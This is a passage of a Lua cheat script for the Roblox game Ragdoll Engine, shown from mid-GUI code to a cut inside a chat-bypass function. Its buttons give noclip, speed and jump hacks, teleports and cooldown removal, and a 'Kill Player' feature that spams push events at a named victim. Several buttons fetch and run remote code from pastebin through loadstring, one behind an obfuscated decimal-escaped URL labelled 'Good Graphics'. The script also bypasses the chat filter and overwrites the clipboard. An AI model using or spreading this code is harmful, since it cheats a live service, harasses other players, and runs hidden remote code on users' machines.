TpBuildingMiddle.BackgroundColor3 = Color3.new(0, 0, 0)
TpBuildingMiddle.BackgroundTransparency = 0.69999998807907
TpBuildingMiddle.BorderColor3 = Color3.new(0, 0, 0)
TpBuildingMiddle.BorderSizePixel = 0
TpBuildingMiddle.Position = UDim2.new(0, 0, 0.666666687, 0)
TpBuildingMiddle.Size = UDim2.new(0, 142, 0, 23)
TpBuildingMiddle.Font = Enum.Font.SourceSansLight
TpBuildingMiddle.Text = "Building Middlle"
TpBuildingMiddle.TextColor3 = Color3.new(1, 1, 1)
TpBuildingMiddle.TextSize = 22
TpBuildingBin.Name = "TpBuildingBin"
TpBuildingBin.Parent = TeleportsContent
TpBuildingBin.BackgroundColor3 = Color3.new(0, 0, 0)
TpBuildingBin.BackgroundTransparency = 0.69999998807907
TpBuildingBin.BorderColor3 = Color3.new(0, 0, 0)
TpBuildingBin.BorderSizePixel = 0
TpBuildingBin.Position = UDim2.new(0, 0, 0.833333373, 0)
TpBuildingBin.Size = UDim2.new(0, 142, 0, 23)
TpBuildingBin.Font = Enum.Font.SourceSansLight
TpBuildingBin.Text = "Building Bin"
TpBuildingBin.TextColor3 = Color3.new(1, 1, 1)
TpBuildingBin.TextSize = 22
TpTempleStaircase.Name = "TpTempleStaircase"
TpTempleStaircase.Parent = TeleportsContent
TpTempleStaircase.BackgroundColor3 = Color3.new(0, 0, 0)
TpTempleStaircase.BackgroundTransparency = 0.69999998807907
TpTempleStaircase.BorderColor3 = Color3.new(0, 0, 0)
TpTempleStaircase.BorderSizePixel = 0
TpTempleStaircase.Position = UDim2.new(0.523489952, 0, 0.833333373, 0)
TpTempleStaircase.Size = UDim2.new(0, 142, 0, 23)
TpTempleStaircase.Font = Enum.Font.SourceSansLight
TpTempleStaircase.Text = "Temple Staircase"
TpTempleStaircase.TextColor3 = Color3.new(1, 1, 1)
TpTempleStaircase.TextSize = 22
TpSpiralStaircase.Name = "TpSpiralStaircase"
TpSpiralStaircase.Parent = TeleportsContent
TpSpiralStaircase.BackgroundColor3 = Color3.new(0, 0, 0)
TpSpiralStaircase.BackgroundTransparency = 0.69999998807907
TpSpiralStaircase.BorderColor3 = Color3.new(0, 0, 0)
TpSpiralStaircase.BorderSizePixel = 0
TpSpiralStaircase.Position = UDim2.new(0.523489952, 0, 0.666666687, 0)
TpSpiralStaircase.Size = UDim2.new(0, 142, 0, 23)
TpSpiralStaircase.Font = Enum.Font.SourceSansLight
TpSpiralStaircase.Text = "Spiral Staircase"
TpSpiralStaircase.TextColor3 = Color3.new(1, 1, 1)
TpSpiralStaircase.TextSize = 22
TpEdge.Name = "TpEdge"
TpEdge.Parent = TeleportsContent
TpEdge.BackgroundColor3 = Color3.new(0, 0, 0)
TpEdge.BackgroundTransparency = 0.69999998807907
TpEdge.BorderColor3 = Color3.new(0, 0, 0)
TpEdge.BorderSizePixel = 0
TpEdge.Position = UDim2.new(0.523489952, 0, 0.5, 0)
TpEdge.Size = UDim2.new(0, 142, 0, 23)
TpEdge.Font = Enum.Font.SourceSansLight
TpEdge.Text = "Edge"
TpEdge.TextColor3 = Color3.new(1, 1, 1)
TpEdge.TextSize = 22
TpCannonRange.Name = "TpCannonRange"
TpCannonRange.Parent = TeleportsContent
TpCannonRange.BackgroundColor3 = Color3.new(0, 0, 0)
TpCannonRange.BackgroundTransparency = 0.69999998807907
TpCannonRange.BorderColor3 = Color3.new(0, 0, 0)
TpCannonRange.BorderSizePixel = 0
TpCannonRange.Position = UDim2.new(0.523489952, 0, 0.333333343, 0)
TpCannonRange.Size = UDim2.new(0, 142, 0, 23)
TpCannonRange.Font = Enum.Font.SourceSansLight
TpCannonRange.Text = "Cannon Range"
TpCannonRange.TextColor3 = Color3.new(1, 1, 1)
TpCannonRange.TextSize = 22
TpPool.Name = "TpPool"
TpPool.Parent = TeleportsContent
TpPool.BackgroundColor3 = Color3.new(0, 0, 0)
TpPool.BackgroundTransparency = 0.69999998807907
TpPool.BorderColor3 = Color3.new(0, 0, 0)
TpPool.BorderSizePixel = 0
TpPool.Position = UDim2.new(0.523489952, 0, 0.166666672, 0)
TpPool.Size = UDim2.new(0, 142, 0, 23)
TpPool.Font = Enum.Font.SourceSansLight
TpPool.Text = "Pool"
TpPool.TextColor3 = Color3.new(1, 1, 1)
TpPool.TextSize = 22
TpBalloon.Name = "TpBalloon"
TpBalloon.Parent = TeleportsContent
TpBalloon.BackgroundColor3 = Color3.new(0, 0, 0)
TpBalloon.BackgroundTransparency = 0.69999998807907
TpBalloon.BorderColor3 = Color3.new(0, 0, 0)
TpBalloon.BorderSizePixel = 0
TpBalloon.Position = UDim2.new(0.523489952, 0, 0, 0)
TpBalloon.Size = UDim2.new(0, 142, 0, 23)
TpBalloon.Font = Enum.Font.SourceSansLight
TpBalloon.Text = "Balloon"
TpBalloon.TextColor3 = Color3.new(1, 1, 1)
TpBalloon.TextSize = 22

--[ STOP SKIDDING YOU FAT FUCK ]--

Noclip.MouseButton1Click:connect(function()
			if phase == false then
		phase = true
		Noclip.TextColor3 = Color3.new(0, 1, 0)
		Noclip.Text = "Noclip - On"
		Stepped = game:GetService("RunService").Stepped:Connect(function()
			if phase == true then
				for a, b in pairs(W:GetChildren()) do
                if b.Name == P.Name then
                for i, v in pairs(W[P.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
			else
				Stepped:Disconnect()
			end
		end)
	elseif phase == true then
		phase = false
		Noclip.TextColor3 = Color3.new(1, 1, 1)
		Noclip.Text = "Noclip - Off"
	end
end)
OpenFrame:TweenPosition(UDim2.new({0, 0}, -197, 0.35))
wait(0.5)
MenuFrame.MouseEnter:connect(function()
	if visual == false then
		MenuFrame:TweenPosition(UDim2.new({0, 0},0, 0))
		wait(0.5)
		visual = true
	end
end)
MenuFrame.MouseEnter:connect(function()
	if dollstopper == true then
	local rag = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Local Ragdoll")
	rag:Destroy()
end
end)
MenuFrame.MouseEnter:connect(function()
	if speeding == false then
	P.Humanoid.WalkSpeed = 150
end
end)
MainFrame.MouseEnter:connect(function()
	if speeding == false then
	P.Humanoid.WalkSpeed = 150
end
end)
MenuFrame.MouseEnter:connect(function()
	if highjumping == false then
	P.Humanoid.JumpPower = 150
end
end)
MainFrame.MouseEnter:connect(function()
	if highjumping == false then
	P.Humanoid.JumpPower = 150
end
end)
MenuFrame.MouseEnter:connect(function()
	if spammer == true then
	local bag = game:GetService("Players").LocalPlayer.Backpack
	bag.ImpulseGrenade.Configuration.Cooldown.Value = 0
	bag.Push.Configuration.Cooldown.Value = 0
end
end)
MainFrame.MouseEnter:connect(function()
	if dollstopper == true then
	local rag = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Local Ragdoll")
	rag:Destroy()
end
end)
MainFrame.MouseEnter:connect(function()
	if spammer == true then
	local bag = game:GetService("Players").LocalPlayer.Backpack
	bag.ImpulseGrenade.Configuration.Cooldown.Value = 0
	bag.Push.Configuration.Cooldown.Value = 0
end
end)
Exit.MouseButton1Click:connect(function()
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)
	MainFrame:TweenPosition(UDim2.new({0, 0},-494, 0.35))
	wait(0.5)
	speeding = true
	highjumping = true
	dollstopper = false
	spammer = false
	phase = false
	mooneffect = true
	Gui:Destroy()
end)
Back.MouseButton1Click:connect(function()
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
Hide.MouseButton1Click:connect(function()
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)
	visual = false
	MainFrame:TweenPosition(UDim2.new({0, 0},-494, 0.35))
	wait(0.9)
	MainFrame.Visible = false
	OpenFrame.Visible = true
	OpenFrame:TweenPosition(UDim2.new({0, 0}, 0, 0.35))
	wait(0.5)
end)
Open.MouseButton1Click:connect(function()
	OpenFrame:TweenPosition(UDim2.new({0, 0}, -197, 0.35))
	wait(0.9)
	OpenFrame.Visible = false
	MainFrame.Visible = true
	MainFrame:TweenPosition(UDim2.new({0, 0},405, 0.35))
	wait(0.5)
end)
MainPage.MouseButton1Click:connect(function()
	TeleportsContent.Visible = false
	FunctionsContent.Visible = false
	MainContent.Visible = true
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
TeleportsPage.MouseButton1Click:connect(function()
	TeleportsContent.Visible = true
	FunctionsContent.Visible = false
	MainContent.Visible = false
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
FunctionsPage.MouseButton1Click:connect(function()
	TeleportsContent.Visible = false
	FunctionsContent.Visible = true
	MainContent.Visible = false
	MenuFrame:TweenPosition(UDim2.new({0, 0},-320, 0))
	wait(0.5)	
	visual = false
end)
VipServer.MouseButton1Click:connect(function()
local bindableFunction= Instance.new("BindableFunction")  game.StarterGui:SetCore("SendNotification", {     Title = "V.I.P. Server:";     Text = "shorturl.at/hoSVZ";     Duration = "20";     callbakc = bindableFunction;     Button1 = ""; })
end)
WalkSpeed.MouseButton1Click:connect(function()
    if speeding == true then
	speeding = false
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
	WalkSpeed.Text = "WalkSpeed - On"
	WalkSpeed.TextColor3 = Color3.new(0, 1, 0)
elseif speeding == false then
	speeding = true
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
	WalkSpeed.Text = "WalkSpeed - Off"
	WalkSpeed.TextColor3 = Color3.new(1, 1, 1)
end
end)
JumpPower.MouseButton1Click:connect(function()
    if highjumping == true then
	highjumping = false
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
	JumpPower.Text = "JumpPower - On"
	JumpPower.TextColor3 = Color3.new(0, 1, 0)
elseif highjumping == false then
	highjumping = true
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
	JumpPower.Text = "JumpPower - Off"
	JumpPower.TextColor3 = Color3.new(1, 1, 1)
end
end)
KillPlayer.MouseButton1Click:connect(function()
local tp_namedplayer = Victim.Text
    local tp_player = game:GetService("Players")[tp_namedplayer]
    local PLR = game:GetService("Players").LocalPlayer
    local p = Victim.Text
   
    if tp_player then
            for i = 1, 60 do
        wait(0.005)
        PLR.Character.HumanoidRootPart.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(1, -1, -1)
        end
    end
end)
KillPlayer.MouseButton1Click:connect(function()
	for i=1, 100000000000000000 do
		for i=1, 15 do
			game.Players.LocalPlayer.Character.Push.PushEvent:FireServer()
	end wait(0.005) end
end)
TpToPlayer.MouseButton1Click:connect(function()
local tp_namedplayer = Victim.Text
    local tp_player = game:GetService("Players")[tp_namedplayer]
    local PLR = game:GetService("Players").LocalPlayer
    local p = Victim.Text
   
    if tp_player then
            for i = 1,1 do
        wait()
        PLR.Character.HumanoidRootPart.CFrame = tp_player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
        end
    end
end)
AltDelete.MouseButton1Click:connect(function()
	if deleting == false then
		local Plr = game:GetService("Players").LocalPlayer
local Mouse = Plr:GetMouse()
Mouse.Button1Down:connect(function()
if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftAlt) then return end
if not Mouse.Target then return end
Mouse.Target:Destroy()
end)
local Plr = game:GetService("Players").LocalPlayer
local Mouse = Plr:GetMouse()
Mouse.Button1Down:connect(function()
if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.RightAlt) then return end
if not Mouse.Target then return end
Mouse.Target:Destroy()
end)
	end
	deleting = true
	AltDelete.TextColor3 = Color3.new(0, 1, 0)
end)
TpEdge.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 3.15, 820)
end)
TpCannonRange.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10, 3.25, 63)
end)
TpPool.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-127.015, 3.3479, -126)
end)
TpBuildingTop.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(161.782, 1013.35, -6)
end)

--[ Now, you are probably wondering why i have text in the middle of the teleports. Its just to annoy you lol.]--

TpBuildingMiddle.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(159.5, 523.4, -32)
end)
TpTempleStaircase.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-17.2, 179.15, -332)
end)
TpSpiralStaircase.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(157, 827.25, -131)
end)
TpSign.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 21, -31)
end)
TpEscalatorBottom.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-132.8, 3, -44)
end)
TpEscalatorTop.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-209, 67.25, -52)
end)
TpBuildingBin.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(150, 4.7, -45)
end)
TpBalloon.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-112, 3.25, 43)
end)
Spin.MouseButton1Click:connect(function()
	local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
bambam.Force = Vector3.new(100,0,100)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
local holding = false
local plr = game.Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local mouse = plr:GetMouse()
local debounce = false
mouse.TargetFilter = workspace:FindFirstChild("Baseplate")

UIS.InputBegan:Connect(function(key)

if key.KeyCode == Enum.KeyCode.LeftControl then

    holding = true

end
end)
wait(0.5)
end)
SpamTools.MouseButton1Click:connect(function()
	local Pl = game:GetService("Players").LocalPlayer
	Pl.Backpack.Push.Configuration.Cooldown.Value = 0
	Pl.Backpack.ImpulseGrenade.Configuration.Cooldown.Value = 0
	SpamTools.TextColor3 = Color3.new(0, 1, 0)
	spammer = true
end)
Gravity.MouseButton1Click:connect(function()
    if mooneffect == true then
	mooneffect = false
	W.Gravity = 0
	Gravity.Text = "Gravity - On"
	Gravity.TextColor3 = Color3.new(0, 1, 0)
elseif mooneffect == false then
	mooneffect = true
	W.Gravity = 196.2
	Gravity.Text = "Gravity - Off"
	Gravity.TextColor3 = Color3.new(1, 1, 1)
end
end)
NoRagdoll.MouseButton1Click:connect(function()
local rag = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Local Ragdoll")
rag:Destroy()
NoRagdoll.TextColor3 = Color3.new(0, 1, 0)
dollstopper = true
end)
function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
counter = 0

while wait(0.05) do
OpenColorBar.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
MainColorBar.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
counter = counter + 0.0075
end
end)

Section:NewButton("Ragdoll Engine Gui 3", "Give op Gui", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local g = Instance.new("TextButton")
local sc = Instance.new("TextButton")
local M = Instance.new("TextButton")
local TextButton = Instance.new("TextButton")
local extra = Instance.new("Frame")
local eee = Instance.new("TextButton")
local eee_2 = Instance.new("TextButton")
local eee_3 = Instance.new("TextButton")
local eee_4 = Instance.new("TextButton")
local eee_5 = Instance.new("TextButton")
local eee_6 = Instance.new("TextButton")
local eee_7 = Instance.new("TextButton")
local scripts = Instance.new("Frame")
local eee_8 = Instance.new("TextButton")
local eee_9 = Instance.new("TextButton")
local eee_10 = Instance.new("TextButton")
local eee_11 = Instance.new("TextButton")
local eee_12 = Instance.new("TextButton")
local eee_13 = Instance.new("TextButton")
local eee_14 = Instance.new("TextButton")
local gui = Instance.new("Frame")
local eee_15 = Instance.new("TextButton")
local eee_16 = Instance.new("TextButton")
local eee_17 = Instance.new("TextButton")
local eee_18 = Instance.new("TextButton")
local eee_19 = Instance.new("TextButton")
local eee_20 = Instance.new("TextButton")
local eee_21 = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
Frame.Position = UDim2.new(0.1996997, 0, 0.198707595, 0)
Frame.Size = UDim2.new(0, 496, 0, 324)
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TextLabel.BorderColor3 = Color3.fromRGB(85, 255, 0)
TextLabel.Size = UDim2.new(0, 487, 0, 48)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TextLabel_2.BorderColor3 = Color3.fromRGB(85, 255, 0)
TextLabel_2.Size = UDim2.new(0, 487, 0, 48)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Ragdoll Engine GUI                                                                           "
TextLabel_2.TextColor3 = Color3.fromRGB(85, 255, 0)
TextLabel_2.TextSize = 25.000

g.Name = "g"
g.Parent = Frame
g.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
g.Position = UDim2.new(0.0451745391, 0, 0.201342285, 0)
g.Size = UDim2.new(0, 121, 0, 48)
g.Font = Enum.Font.SourceSans
g.Text = "GUIS"
g.TextColor3 = Color3.fromRGB(85, 255, 0)
g.TextSize = 25.000

sc.Name = "sc"
sc.Parent = Frame
sc.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
sc.Position = UDim2.new(0.375770003, 0, 0.201342285, 0)
sc.Size = UDim2.new(0, 121, 0, 48)
sc.Font = Enum.Font.SourceSans
sc.Text = "Scripts"
sc.TextColor3 = Color3.fromRGB(85, 255, 0)
sc.TextSize = 25.000

M.Name = "M"
M.Parent = Frame
M.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
M.Position = UDim2.new(0.710733116, 0, 0.201342285, 0)
M.Size = UDim2.new(0, 121, 0, 48)
M.Font = Enum.Font.SourceSans
M.Text = "Misc"
M.TextColor3 = Color3.fromRGB(85, 255, 0)
M.TextSize = 25.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TextButton.BorderColor3 = Color3.fromRGB(85, 255, 0)
TextButton.Position = UDim2.new(0.751540065, 0, 0, 0)
TextButton.Size = UDim2.new(0, 121, 0, 48)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Enjoy!"
TextButton.TextColor3 = Color3.fromRGB(85, 255, 0)
TextButton.TextSize = 30.000

extra.Name = "extra"
extra.Parent = Frame
extra.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
extra.BackgroundTransparency = 3.000
extra.BorderColor3 = Color3.fromRGB(85, 255, 0)
extra.Position = UDim2.new(0, 0, 0.399328858, 0)
extra.Size = UDim2.new(0, 487, 0, 179)

eee.Name = "eee"
eee.Parent = extra
eee.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee.Position = UDim2.new(0.677618027, 0, 0.0172472, 0)
eee.Size = UDim2.new(0, 144, 0, 52)
eee.Font = Enum.Font.SourceSans
eee.Text = "Click Invisible"
eee.TextColor3 = Color3.fromRGB(85, 255, 0)
eee.TextSize = 25.000
eee.MouseButton1Down:connect(function()
	a=game.Players:FindFirstChild("OddPotion",true)
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	local backpack = localPlayer:WaitForChild("Backpack")

	local tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Parent = backpack
	tool.Name = "Invisible Object"
	tool.Equipped:Connect(function(mouse)
		mouse.Button1Down:Connect(function()
			if mouse.Target and mouse.Target.Parent then
				a.TransEvent:FireServer(mouse.Target,1)
			end
		end)
	end)
	a=game.Players:FindFirstChild("OddPotion",true)
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	local backpack = localPlayer:WaitForChild("Backpack")

	local tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Parent = backpack
	tool.Name = "Visible Object"
	tool.Equipped:Connect(function(mouse)
		mouse.Button1Down:Connect(function()
			if mouse.Target and mouse.Target.Parent then
				a.TransEvent:FireServer(mouse.Target,0)
			end
		end)
	end)
end)

eee_2.Name = "eee"
eee_2.Parent = extra
eee_2.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_2.Position = UDim2.new(0.351129353, 0, 0.0172472, 0)
eee_2.Size = UDim2.new(0, 144, 0, 52)
eee_2.Font = Enum.Font.SourceSans
eee_2.Text = "Dex"
eee_2.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_2.TextSize = 25.000
eee_2.MouseButton1Down:connect(function()
	loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
end)


eee_3.Name = "eee"
eee_3.Parent = extra
eee_3.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_3.Position = UDim2.new(0.0225872695, 0, 0.0172472, 0)
eee_3.Size = UDim2.new(0, 144, 0, 52)
eee_3.Font = Enum.Font.SourceSans
eee_3.Text = "Lime X Discord"
eee_3.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_3.TextSize = 20.000
eee_8.MouseButton1Down:connect(function()
wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Discord Invite";
	Text = "The Discord invite has been copied!";
})
setclipboard ("https://discord.gg/5z9PZqbFnX")

end)

eee_4.Name = "eee"
eee_4.Parent = extra
eee_4.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_4.Position = UDim2.new(0.0225872695, 0, 0.369483739, 0)
eee_4.Size = UDim2.new(0, 144, 0, 52)
eee_4.Font = Enum.Font.SourceSans
eee_4.Text = "No Ragdoll"
eee_4.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_4.TextSize = 25.000
eee_4.MouseButton1Down:connect(function()
	local player = game:GetService("Players").LocalPlayer
	local rag = player.Character:FindFirstChild("Local Ragdoll")
	rag:Remove()
	wait(0.3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Lime X ";
		Text = "You can no longer ragdoll!";
	})
end)


eee_5.Name = "eee"
eee_5.Parent = extra
eee_5.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_5.Position = UDim2.new(0.351129353, 0, 0.369483739, 0)
eee_5.Size = UDim2.new(0, 144, 0, 52)
eee_5.Font = Enum.Font.SourceSans
eee_5.Text = "No Cooldown"
eee_5.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_5.TextSize = 25.000
eee_5.MouseButton1Down:connect(function()
	wait(0.3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Lime X No Cooldown";
		Text = "You can now bomb and push whenever you like!";
	})	
	
	game.Players.LocalPlayer.Backpack.ImpulseGrenade.Configuration.Cooldown.Value = 0	
	game.Players.LocalPlayer.Backpack.Push.Configuration.Cooldown.Value = 0
end)

eee_6.Name = "eee"
eee_6.Parent = extra
eee_6.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_6.Position = UDim2.new(0.677618027, 0, 0.369483739, 0)
eee_6.Size = UDim2.new(0, 144, 0, 52)
eee_6.Font = Enum.Font.SourceSans
eee_6.Text = "Trash Free Push"
eee_6.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_6.TextSize = 24.000
eee_6.MouseButton1Down:connect(function()
	wait(0.3)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "Lime X Free Push";
		Text = "You're Game Might freeze when you push!";
	})
	loadstring(game:HttpGet("https://pastebin.com/raw/99zNVNHr", true))()

end)


eee_7.Name = "eee"
eee_7.Parent = extra
eee_7.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_7.Position = UDim2.new(0.0205338821, 0, 0.743785322, 0)
eee_7.Size = UDim2.new(0, 463, 0, 52)
eee_7.Font = Enum.Font.SourceSans
eee_7.Text = "Destroy GUI ):"
eee_7.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_7.TextSize = 30.000
eee_7.MouseButton1Down:connect(function()
wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Lime X";
	Text = "Press P To Toggle / Untoggle the gui!";
})
end)

scripts.Name = "scripts"
scripts.Parent = Frame
scripts.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
scripts.BackgroundTransparency = 3.000
scripts.BorderColor3 = Color3.fromRGB(85, 255, 0)
scripts.Position = UDim2.new(0, 0, 0.399328858, 0)
scripts.Size = UDim2.new(0, 487, 0, 179)

eee_8.Name = "eee"
eee_8.Parent = scripts
eee_8.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_8.Position = UDim2.new(0.677618027, 0, 0.0172472, 0)
eee_8.Size = UDim2.new(0, 144, 0, 52)
eee_8.Font = Enum.Font.SourceSans
eee_8.Text = "Fps Booster"
eee_8.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_8.TextSize = 25.000
eee_8.MouseButton1Down:connect(function()
	local a = game
	local b = a.Workspace
	local c = a.Lighting
	local d = b.Terrain
	d.WaterWaveSize = 0
	d.WaterWaveSpeed = 0
	d.WaterReflectance = 0
	d.WaterTransparency = 0
	c.GlobalShadows = false
	c.FogEnd = 9e9
	c.Brightness = 0
	settings().Rendering.QualityLevel = "Level01"
	for e, f in pairs(a:GetDescendants()) do
		if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
			f.Material = "Plastic"
			f.Reflectance = 0
		elseif f:IsA("Decal") or f:IsA("Texture") then
			f.Transparency = 0
		elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
			f.Lifetime = NumberRange.new(0)
		elseif f:IsA("Explosion") then
			f.BlastPressure = 0
			f.BlastRadius = 0
		elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
			f.Enabled = false
		elseif f:IsA("MeshPart") then
			f.Material = "Plastic"
			f.Reflectance = 0
			f.TextureID = 10385902758728957
		end
	end
	for e, g in pairs(c:GetChildren()) do
		if
			g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or
				g:IsA("DepthOfFieldEffect")
		then
			g.Enabled = false
		end
	end
	sethiddenproperty(game.Lighting, "Technology", "Compatibility")
end)


eee_9.Name = "eee"
eee_9.Parent = scripts
eee_9.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_9.Position = UDim2.new(0.351129353, 0, 0.0172472, 0)
eee_9.Size = UDim2.new(0, 144, 0, 52)
eee_9.Font = Enum.Font.SourceSans
eee_9.Text = "CMD X"
eee_9.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_9.TextSize = 25.000
eee_9.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/F3JvpCDM",true))()
end)

eee_10.Name = "eee"
eee_10.Parent = scripts
eee_10.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_10.Position = UDim2.new(0.0225872695, 0, 0.0172472, 0)
eee_10.Size = UDim2.new(0, 144, 0, 52)
eee_10.Font = Enum.Font.SourceSans
eee_10.Text = "IY"
eee_10.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_10.TextSize = 25.000
eee_10.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)


eee_11.Name = "eee"
eee_11.Parent = scripts
eee_11.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_11.Position = UDim2.new(0.0225872695, 0, 0.369483739, 0)
eee_11.Size = UDim2.new(0, 144, 0, 52)
eee_11.Font = Enum.Font.SourceSans
eee_11.Text = "Good Graphics"
eee_11.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_11.TextSize = 25.000
eee_11.MouseButton1Down:connect(function()
	_G.BlurSize = 3

	_G.ColorCorrectionBrightness = 0.03
	_G.ColorCorrectionContrast = 0.3
	_G.ColorCorrectionSaturation = 0.01
	_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)

	_G.SunRaysIntensity = 0.2
	_G.SunRaysSpread = 1

	-- Lighting settings:
	_G.GlobalShadows = true
	_G.Brightness = 0.9
	_G.GeographicLatitude = 350
	_G.TimeOfDay = 17
	_G.ExposureCompensation = 0.03


	spawn(function()
		loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
	end)
end)


eee_12.Name = "eee"
eee_12.Parent = scripts
eee_12.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
eee_12.Position = UDim2.new(0.351129353, 0, 0.369483739, 0)
eee_12.Size = UDim2.new(0, 144, 0, 52)
eee_12.Font = Enum.Font.SourceSans
eee_12.Text = "Chat Bypass"
eee_12.TextColor3 = Color3.fromRGB(85, 255, 0)
eee_12.TextSize = 25.000
eee_12.MouseButton1Down:connect(function()
	local function callback(Text)
		if Text == "Swear Word GUI" then
